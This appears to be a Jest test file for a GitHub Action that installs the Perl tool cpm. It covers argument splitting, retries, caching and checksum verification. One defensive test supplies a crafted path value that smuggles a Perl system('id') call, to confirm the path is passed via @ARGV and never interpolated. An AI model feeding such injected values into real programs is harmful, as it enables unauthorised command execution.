    test("splits simple whitespace-separated args", () => {
        expect(lib.split_args("--with-recommends --with-suggests")).toEqual([
            "--with-recommends",
            "--with-suggests",
        ]);
    });

    test("handles leading and trailing whitespace", () => {
        expect(lib.split_args("  --foo  --bar  ")).toEqual(["--foo", "--bar"]);
    });

    test("handles double-quoted values with spaces", () => {
        expect(lib.split_args('--option "value with spaces"')).toEqual([
            "--option",
            "value with spaces",
        ]);
    });

    test("handles single-quoted values with spaces", () => {
        expect(lib.split_args("--option 'value with spaces'")).toEqual([
            "--option",
            "value with spaces",
        ]);
    });

    test("handles backslash escapes inside double quotes", () => {
        expect(lib.split_args('--option "say \\"hello\\""')).toEqual([
            "--option",
            'say "hello"',
        ]);
    });

    test("does not process escapes inside single quotes", () => {
        expect(lib.split_args("--option 'no\\\\escape'")).toEqual([
            "--option",
            "no\\\\escape",
        ]);
    });

    test("handles empty string", () => {
        expect(lib.split_args("")).toEqual([]);
    });

    test("handles multiple quoted segments", () => {
        expect(
            lib.split_args('--a "one two" --b "three four"')
        ).toEqual(["--a", "one two", "--b", "three four"]);
    });

    test("handles quoted value adjacent to unquoted", () => {
        expect(lib.split_args('--prefix="my dir"')).toEqual([
            '--prefix=my dir',
        ]);
    });

    test("handles installdeps dot (common usage)", () => {
        expect(lib.split_args("--installdeps .")).toEqual([
            "--installdeps",
            ".",
        ]);
    });
});

describe("do_exec mutation", () => {
    test("does not mutate the caller's cmd array", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "sudo") return "false";
            return "";
        });
        exec.exec.mockResolvedValue(0);
        jest.spyOn(os, "platform").mockReturnValue("linux");

        const cmd = ["/usr/bin/perl", "-e", "1"];
        await lib.do_exec(cmd);

        // The caller's array must remain intact
        expect(cmd).toEqual(["/usr/bin/perl", "-e", "1"]);
    });

    test("does not mutate cmd array when sudo is enabled", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "sudo") return "true";
            return "";
        });
        exec.exec.mockResolvedValue(0);
        jest.spyOn(os, "platform").mockReturnValue("linux");

        const cmd = ["/usr/bin/perl", "-e", "1"];
        await lib.do_exec(cmd);

        expect(cmd).toEqual(["/usr/bin/perl", "-e", "1"]);
    });
});

describe("do_exec retry", () => {
    // Stub out the real setTimeout-based sleep so tests don't actually wait.
    let sleep_spy;
    beforeEach(() => {
        sleep_spy = jest
            .spyOn(lib, "_sleep_ms")
            .mockImplementation(() => Promise.resolve());
        jest.spyOn(os, "platform").mockReturnValue("linux");
    });
    afterEach(() => {
        sleep_spy.mockRestore();
    });

    function mockInputs(inputs) {
        core.getInput.mockImplementation((name) =>
            inputs[name] !== undefined ? inputs[name] : ""
        );
    }

    test("succeeds on first attempt: no retry, no sleep", async () => {
        mockInputs({ sudo: "false", retries: "2", "retry-wait": "20" });
        exec.exec.mockResolvedValue(0);

        await lib.do_exec(["/usr/bin/perl", "-e", "1"]);

        expect(exec.exec).toHaveBeenCalledTimes(1);
        expect(core.warning).not.toHaveBeenCalled();
    });

    test("retries on transient failure then succeeds", async () => {
        mockInputs({ sudo: "false", retries: "2", "retry-wait": "20" });
        exec.exec
            .mockRejectedValueOnce(new Error("599 Internal Exception"))
            .mockResolvedValueOnce(0);

        await lib.do_exec(["cpm", "install"]);

        expect(exec.exec).toHaveBeenCalledTimes(2);
        expect(core.warning).toHaveBeenCalledWith(
            expect.stringContaining("attempt 1/3")
        );
        // Linear backoff on first retry: retry-wait * 1 = 20s
        expect(lib._sleep_ms).toHaveBeenCalledWith(20 * 1000);
    });

    test("gives up after max attempts and rethrows last error", async () => {
        mockInputs({ sudo: "false", retries: "2", "retry-wait": "5" });
        exec.exec.mockRejectedValue(new Error("connection timed out"));

        await expect(lib.do_exec(["cpm", "install"])).rejects.toThrow(
            "connection timed out"
        );

        // retries=2 -> 3 total attempts
        expect(exec.exec).toHaveBeenCalledTimes(3);
        // Linear backoff: 5s then 10s
        expect(lib._sleep_ms).toHaveBeenNthCalledWith(1, 5 * 1000);
        expect(lib._sleep_ms).toHaveBeenNthCalledWith(2, 10 * 1000);
    });

    test("retries=0 disables retry loop", async () => {
        mockInputs({ sudo: "false", retries: "0", "retry-wait": "20" });
        exec.exec.mockRejectedValue(new Error("boom"));

        await expect(lib.do_exec(["cpm", "install"])).rejects.toThrow("boom");

        expect(exec.exec).toHaveBeenCalledTimes(1);
        expect(lib._sleep_ms).not.toHaveBeenCalled();
    });

    test("defaults: retries=2 when input is empty", async () => {
        mockInputs({ sudo: "false" });
        exec.exec.mockRejectedValue(new Error("boom"));

        await expect(lib.do_exec(["cpm", "install"])).rejects.toThrow("boom");

        expect(exec.exec).toHaveBeenCalledTimes(3);
    });

    test("invalid retries input falls back to default", async () => {
        mockInputs({ sudo: "false", retries: "not-a-number" });
        exec.exec.mockRejectedValue(new Error("boom"));

        await expect(lib.do_exec(["cpm", "install"])).rejects.toThrow("boom");

        // Falls back to default of 2 retries = 3 attempts
        expect(exec.exec).toHaveBeenCalledTimes(3);
    });

    test("caps per-attempt delay at MAX_RETRY_DELAY_S", async () => {
        // retry-wait=200, attempt 2 → 400s uncapped, should be capped to 300s
        mockInputs({ sudo: "false", retries: "2", "retry-wait": "200" });
        exec.exec
            .mockRejectedValueOnce(new Error("fail"))
            .mockRejectedValueOnce(new Error("fail"))
            .mockRejectedValueOnce(new Error("fail"));

        await expect(lib.do_exec(["cpm", "install"])).rejects.toThrow("fail");

        // attempt 1: min(200*1, 300) = 200s
        expect(lib._sleep_ms).toHaveBeenNthCalledWith(1, 200 * 1000);
        // attempt 2: min(200*2, 300) = 300s (capped)
        expect(lib._sleep_ms).toHaveBeenNthCalledWith(2, lib.MAX_RETRY_DELAY_S * 1000);
    });

    test("delay never exceeds MAX_RETRY_DELAY_S even with very high retry-wait", async () => {
        mockInputs({ sudo: "false", retries: "1", "retry-wait": "9999" });
        exec.exec
            .mockRejectedValueOnce(new Error("fail"))
            .mockResolvedValueOnce(0);

        await lib.do_exec(["cpm", "install"]);

        expect(lib._sleep_ms).toHaveBeenCalledWith(lib.MAX_RETRY_DELAY_S * 1000);
    });

    test("negative retries input falls back to default", async () => {
        mockInputs({ sudo: "false", retries: "-1" });
        exec.exec.mockRejectedValue(new Error("boom"));

        await expect(lib.do_exec(["cpm", "install"])).rejects.toThrow("boom");

        expect(exec.exec).toHaveBeenCalledTimes(3);
    });
});

describe("_parse_non_negative_int", () => {
    test.each([
        ["", 2, 2],
        [null, 2, 2],
        [undefined, 2, 2],
        ["0", 2, 0],
        ["1", 2, 1],
        ["42", 2, 42],
        ["-1", 2, 2],
        ["abc", 2, 2],
        ["1.5", 2, 1], // parseInt truncates
    ])("_parse_non_negative_int(%p, %p) = %p", (raw, fallback, expected) => {
        expect(lib._parse_non_negative_int(raw, fallback)).toBe(expected);
    });
});

describe("install_cpm_location path injection safety", () => {
    test("passes path via @ARGV, not Perl string interpolation", async () => {
        // A path containing Perl-dangerous characters: double quotes and
        // a system() call that would execute if interpolated in a dq string.
        const maliciousPath = '$Config{installsitescript}"; system("id"); "';
        core.getInput.mockImplementation((name) => {
            if (name === "path") return maliciousPath;
            return "";
        });
        exec.exec.mockImplementation(async (bin, args, options) => {
            if (options && options.listeners && options.listeners.stdout) {
                options.listeners.stdout(Buffer.from("/usr/local/bin/cpm"));
            }
            return 0;
        });
        await lib.install_cpm_location("/usr/bin/perl");

        const execArgs = exec.exec.mock.calls[0];
        const args = execArgs[1];
        // The -e script must be a static string — no user input embedded
        expect(args[2]).not.toContain(maliciousPath);
        expect(args[2]).not.toContain('system');
        // The raw path must be passed as a separate argument via @ARGV
        expect(args[3]).toBe(maliciousPath);
    });

    test("handles backslash paths without embedding in Perl string", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "path") return "C:\\Perl\\bin\\cpm";
            return "";
        });
        exec.exec.mockImplementation(async (bin, args, options) => {
            if (options && options.listeners && options.listeners.stdout) {
                options.listeners.stdout(Buffer.from("C:\\Perl\\bin\\cpm"));
            }
            return 0;
        });

        await lib.install_cpm_location("/usr/bin/perl");

        const execArgs = exec.exec.mock.calls[0];
        const args = execArgs[1];
        // Path passed via @ARGV, not interpolated
        expect(args[3]).toBe("C:\\Perl\\bin\\cpm");
        // Script is static — no embedded path
        expect(args[2]).not.toContain("C:\\\\");
    });

    test("still supports $Config{key} interpolation via safe regex", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "path") return "$Config{installsitescript}/cpm";
            return "";
        });
        exec.exec.mockImplementation(async (bin, args, options) => {
            if (options && options.listeners && options.listeners.stdout) {
                options.listeners.stdout(Buffer.from("/usr/local/bin/cpm"));
            }
            return 0;
        });
        await lib.install_cpm_location("/usr/bin/perl");

        const execArgs = exec.exec.mock.calls[0];
        const args = execArgs[1];
        // The Perl script should use @ARGV and a safe $Config substitution
        expect(args[2]).toContain('$ARGV[0]');
        expect(args[2]).toContain('$Config');
        // The raw path template is the last argument
        expect(args[3]).toBe("$Config{installsitescript}/cpm");
    });
});

describe("is_immutable_ref", () => {
    test.each([
        ["0.997014", true],
        ["0.990", true],
        ["1.0", true],
        ["v1.0", true],
        ["v2.5.3", true],
        ["abc1234", true], // short SHA
        ["a".repeat(40), true], // full SHA
        ["main", false],
        ["master", false],
        ["dev", false],
        ["release/2.0", false],
        ["", false],
        [null, false],
        [undefined, false],
    ])("is_immutable_ref(%p) → %p", (input, expected) => {
        expect(lib.is_immutable_ref(input)).toBe(expected);
    });
});

describe("cpm_cache_key", () => {
    test("immutable ref (semver tag): plain key, no date suffix", () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "0.997014";
            return "";
        });
        jest.spyOn(os, "platform").mockReturnValue("linux");

        expect(lib.cpm_cache_key()).toBe("cpm-script-0.997014-linux");
    });

    test("immutable ref (commit SHA): plain key, no date suffix", () => {
        const sha = "deadbeefcafebabe1234567890abcdef12345678";
        core.getInput.mockImplementation((name) => {
            if (name === "version") return sha;
            return "";
        });
        jest.spyOn(os, "platform").mockReturnValue("linux");

        expect(lib.cpm_cache_key()).toBe(`cpm-script-${sha}-linux`);
    });

    test("mutable ref (branch): key gets daily UTC date suffix", () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "main";
            return "";
        });
        jest.spyOn(os, "platform").mockReturnValue("darwin");

        const today = new Date().toISOString().slice(0, 10);
        expect(lib.cpm_cache_key()).toBe(`cpm-script-main-darwin-${today}`);
    });

    test("mutable ref: key changes when day changes", () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "main";
            return "";
        });
        jest.spyOn(os, "platform").mockReturnValue("linux");

        const realDate = Date;
        try {
            global.Date = class extends realDate {
                constructor() {
                    super();
                    return new realDate("2026-01-15T10:00:00Z");
                }
                static now() {
                    return new realDate("2026-01-15T10:00:00Z").getTime();
                }
            };
            const day1 = lib.cpm_cache_key();

            global.Date = class extends realDate {
                constructor() {
                    super();
                    return new realDate("2026-01-16T10:00:00Z");
                }
                static now() {
                    return new realDate("2026-01-16T10:00:00Z").getTime();
                }
            };
            const day2 = lib.cpm_cache_key();

            expect(day1).toBe("cpm-script-main-linux-2026-01-15");
            expect(day2).toBe("cpm-script-main-linux-2026-01-16");
            expect(day1).not.toBe(day2);
        } finally {
            global.Date = realDate;
        }
    });
});

describe("cpm_cache_dir", () => {
    test("returns a path under tmpdir", () => {
        const dir = lib.cpm_cache_dir();
        expect(dir).toBe(path.join(os.tmpdir(), "cpm-cache"));
    });
});

describe("install_cpm caching", () => {
    beforeEach(() => {
        jest.spyOn(os, "platform").mockReturnValue("linux");
    });

    test("skips download on cache hit", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "0.997014";
            if (name === "sudo") return "false";
            return "";
        });
        cache.restoreCache.mockResolvedValue("cpm-script-0.997014-linux");
        exec.exec.mockResolvedValue(0);

        const result = await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");

        expect(tc.downloadTool).not.toHaveBeenCalled();
        expect(cache.saveCache).not.toHaveBeenCalled();
        expect(core.info).toHaveBeenCalledWith(
            expect.stringContaining("Cache hit")
        );
        expect(result.cacheHit).toBe(true);
    });

    test("downloads and saves cache on cache miss", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "0.997014";
            if (name === "sudo") return "false";
            return "";
        });
        cache.restoreCache.mockResolvedValue(undefined);
        tc.downloadTool.mockResolvedValue("/tmp/cpm-downloaded");
        exec.exec.mockResolvedValue(0);
        io.cp.mockResolvedValue();
        io.mkdirP.mockResolvedValue();

        const result = await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");

        expect(tc.downloadTool).toHaveBeenCalledWith(
            "https://raw.githubusercontent.com/skaji/cpm/0.997014/cpm"
        );
        expect(io.mkdirP).toHaveBeenCalled();
        expect(cache.saveCache).toHaveBeenCalledWith(
            [lib.cpm_cache_dir()],
            "cpm-script-0.997014-linux"
        );
        expect(result.cacheHit).toBe(false);
    });

    test("mutable ref cache miss saves with daily-rotated key", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "main";
            if (name === "sudo") return "false";
            return "";
        });
        cache.restoreCache.mockResolvedValue(undefined);
        tc.downloadTool.mockResolvedValue("/tmp/cpm-downloaded");
        exec.exec.mockResolvedValue(0);
        io.cp.mockResolvedValue();
        io.mkdirP.mockResolvedValue();

        await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");

        const today = new Date().toISOString().slice(0, 10);
        expect(cache.saveCache).toHaveBeenCalledWith(
            [lib.cpm_cache_dir()],
            `cpm-script-main-linux-${today}`
        );
    });

    test("continues on cache restore failure", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "main";
            if (name === "sudo") return "false";
            return "";
        });
        cache.restoreCache.mockRejectedValue(new Error("cache unavailable"));
        tc.downloadTool.mockResolvedValue("/tmp/cpm-downloaded");
        exec.exec.mockResolvedValue(0);
        io.cp.mockResolvedValue();
        io.mkdirP.mockResolvedValue();

        await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");

        // Should fall back to download
        expect(tc.downloadTool).toHaveBeenCalled();
    });

    test("continues on cache save failure", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "main";
            if (name === "sudo") return "false";
            return "";
        });
        cache.restoreCache.mockResolvedValue(undefined);
        tc.downloadTool.mockResolvedValue("/tmp/cpm-downloaded");
        cache.saveCache.mockRejectedValue(new Error("save failed"));
        exec.exec.mockResolvedValue(0);
        io.cp.mockResolvedValue();
        io.mkdirP.mockResolvedValue();

        // Should not throw
        await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");

        expect(core.info).toHaveBeenCalledWith(
            expect.stringContaining("Cache save failed")
        );
    });
});

describe("compute_sha256", () => {
    test("computes correct SHA-256 hex digest", () => {
        const content = "#!/usr/bin/env perl\nprint 'hello cpm';\n";
        const expected = crypto.createHash("sha256").update(content).digest("hex");

        readFileSyncSpy.mockReturnValue(Buffer.from(content));

        const result = lib.compute_sha256("/tmp/cpm-script");

        expect(result).toBe(expected);
        expect(readFileSyncSpy).toHaveBeenCalledWith("/tmp/cpm-script");
    });
});

describe("verify_checksum", () => {
    const SCRIPT_CONTENT = "#!/usr/bin/env perl\nuse App::cpm;\n";
    const CORRECT_HASH = crypto.createHash("sha256").update(SCRIPT_CONTENT).digest("hex");

    beforeEach(() => {
        readFileSyncSpy.mockReturnValue(Buffer.from(SCRIPT_CONTENT));
    });

    test("passes when expected checksum matches", () => {
        const result = lib.verify_checksum("/tmp/cpm", CORRECT_HASH);

        expect(result).toBe(CORRECT_HASH);
        expect(core.info).toHaveBeenCalledWith(`cpm SHA-256: ${CORRECT_HASH}`);
    });

    test("passes with uppercase expected checksum", () => {
        const result = lib.verify_checksum("/tmp/cpm", CORRECT_HASH.toUpperCase());

        expect(result).toBe(CORRECT_HASH);
    });

    test("throws on checksum mismatch", () => {
        const wrongHash = "a".repeat(64);

        expect(() => lib.verify_checksum("/tmp/cpm", wrongHash)).toThrow(
            /checksum mismatch/i
        );
    });

    test("logs hash but does not throw when no expected checksum", () => {
        const result = lib.verify_checksum("/tmp/cpm", "");

        expect(result).toBe(CORRECT_HASH);
        expect(core.info).toHaveBeenCalledWith(`cpm SHA-256: ${CORRECT_HASH}`);
    });

    test("logs hash but does not throw when expected is undefined", () => {
        const result = lib.verify_checksum("/tmp/cpm", undefined);

        expect(result).toBe(CORRECT_HASH);
    });
});

describe("install_cpm checksum integration", () => {
    const SCRIPT_CONTENT = "#!/usr/bin/env perl\n";
    const CORRECT_HASH = crypto.createHash("sha256").update(SCRIPT_CONTENT).digest("hex");

    beforeEach(() => {
        jest.spyOn(os, "platform").mockReturnValue("linux");
        readFileSyncSpy.mockReturnValue(Buffer.from(SCRIPT_CONTENT));
        tc.downloadTool.mockResolvedValue("/tmp/cpm-downloaded");
        exec.exec.mockResolvedValue(0);
        io.cp.mockResolvedValue();
        io.mkdirP.mockResolvedValue();
    });

    test("succeeds when checksum matches downloaded script", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "0.997014";
            if (name === "checksum") return CORRECT_HASH;
            if (name === "sudo") return "false";
            return "";
        });

        const result = await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");

        expect(result.path).toBe("/usr/local/bin/cpm");
        expect(core.info).toHaveBeenCalledWith(`cpm SHA-256: ${CORRECT_HASH}`);
    });

    test("fails when checksum does not match", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "0.997014";
            if (name === "checksum") return "b".repeat(64);
            if (name === "sudo") return "false";
            return "";
        });

        await expect(
            lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm")
        ).rejects.toThrow(/checksum mismatch/i);
    });

    test("skips verification when checksum input is empty", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "main";
            if (name === "checksum") return "";
            if (name === "sudo") return "false";
            return "";
        });

        const result = await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");

        expect(result.path).toBe("/usr/local/bin/cpm");
        // Hash should still be logged
        expect(core.info).toHaveBeenCalledWith(expect.stringContaining("cpm SHA-256:"));
    });

    test("does not cache script when checksum fails", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "0.997014";
            if (name === "checksum") return "b".repeat(64); // wrong hash
            if (name === "sudo") return "false";
            return "";
        });

        await expect(
            lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm")
        ).rejects.toThrow(/checksum mismatch/i);

        // The corrupted download must NOT be saved to cache
        expect(cache.saveCache).not.toHaveBeenCalled();
    });

    test("verifies checksum on cache hit too", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "0.997014";
            if (name === "checksum") return "c".repeat(64); // wrong hash
            if (name === "sudo") return "false";
            return "";
        });
        cache.restoreCache.mockResolvedValue("cpm-script-0.997014-linux");

        await expect(
            lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm")
        ).rejects.toThrow(/checksum mismatch/i);

        // Should not have tried to download
        expect(tc.downloadTool).not.toHaveBeenCalled();
    });
});
